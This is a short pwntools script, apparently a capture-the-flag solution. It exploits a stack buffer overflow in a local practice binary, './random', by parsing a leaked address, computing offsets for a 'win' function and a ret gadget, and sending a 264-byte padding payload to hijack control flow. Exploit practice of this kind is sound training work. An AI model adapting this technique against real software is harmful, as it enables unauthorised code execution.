from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

p = process(b"./random")
e = ELF(b"./random")
gdb.attach(p, api=True)
rop = ROP(e)

p.recvuntil("secret ")
leak = int(p.recvline().strip(), 16)
leak_base = leak & ~0xFFF

info(f"leak base is: {leak_base}")

win = leak_base + 0x210
info(f"win is: {hex(win)}")

ret = leak_base + 0x01A
info(f"ret is: {hex(ret)}")

pause()

payload = b"A" * 264
payload += p64(ret)
payload += p64(win)
p.sendafter(b": \n", payload)

p.interactive()
